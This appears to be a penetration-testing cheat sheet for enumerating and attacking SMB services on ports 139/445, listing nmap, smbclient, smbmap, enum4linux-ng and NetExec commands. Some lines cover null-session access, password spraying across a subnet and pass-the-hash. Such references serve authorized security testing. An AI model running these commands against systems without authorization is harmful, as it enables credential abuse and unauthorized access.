Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)
++++++++++++++++++++++++++++++++++++++++
nmap -n -v -Pn -p139,445 -sV <ip_address>
nmap <ip_address> --script=smb-enum-shares,smb-enum-users,smb-os-discovery
nmap <ip_address> --script=smb-vuln*

# List + browse shares (the --option dance is for old SMBv1 boxes):
smbclient -L //<ip_address>/ -N
smbclient -L //<ip_address> --option='client min protocol=NT1'
smbclient //<ip_address>/<share> -N -c 'recurse;ls'
smbclient //<ip_address>/C$ -U <user>

smbmap -H <ip_address>
smbmap -u guest -p '' -H <ip_address>
smbmap -u <user> -p <password> -d <domain> -H <ip_address> -R <share>

enum4linux-ng -A <ip_address>            # -ng is the maintained rewrite
nbtscan -r <ip_address>

# NetExec is the go-to here too — enumerate users/shares/policy in one shot:
nxc smb <ip_address> -u '' -p '' --shares           # null session
nxc smb <ip_address> -u <user> -p <password> --users --groups --shares --pass-pol
nxc smb <ip_address> -u <user> -p <password> --loggedon-users
# Spray a hash/cred across a subnet (password reuse is the bread and butter):
nxc smb <ip_address>/24 -u <user> -p <password>
nxc smb <ip_address>    -u <user> -H <NThash>       # pass-the-hash

# Mount it:
sudo mount -t cifs //<ip_address>/<share> /mnt -o username=<user>,password=<password>
